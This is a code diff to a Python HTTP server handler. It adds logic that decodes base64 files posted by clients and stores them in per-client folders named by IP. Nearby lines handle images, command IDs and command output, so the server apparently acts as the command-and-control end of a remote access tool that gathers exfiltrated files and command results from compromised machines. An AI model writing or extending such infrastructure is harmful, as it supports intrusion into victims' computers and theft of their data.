@@ -134,6 +134,27 @@ class MyHandler(BaseHTTPRequestHandler):
                         print(f"[-] Failed to decode/save image: {e}")
 
 
+                # Handle file if present
+                file_b64 = parsed.get('file', [None])[0]
+                if file_b64:
+                    try:
+                        file_data = base64.b64decode(file_b64)
+                        client_id = self.get_client_id_by_ip() or "unknown"
+                        file_name = parsed.get('filename', ['unnamed'])[0]
+
+                        # Create client directory if it doesn't exist
+                        dir_path = Path(client_id)
+                        dir_path.mkdir(exist_ok=True)
+
+                        filepath = dir_path / file_name
+                        with open(filepath, 'wb') as f:
+                            f.write(file_data)
+
+                        print(f"[+] Saved file: {filepath}")
+                    except Exception as e:
+                        print(f"[-] Failed to save file: {e}")
+
+
                 cmd_id = parsed.get('command_id', [None])[0]
                 cmd_output = parsed.get('output', [''])[0]
 
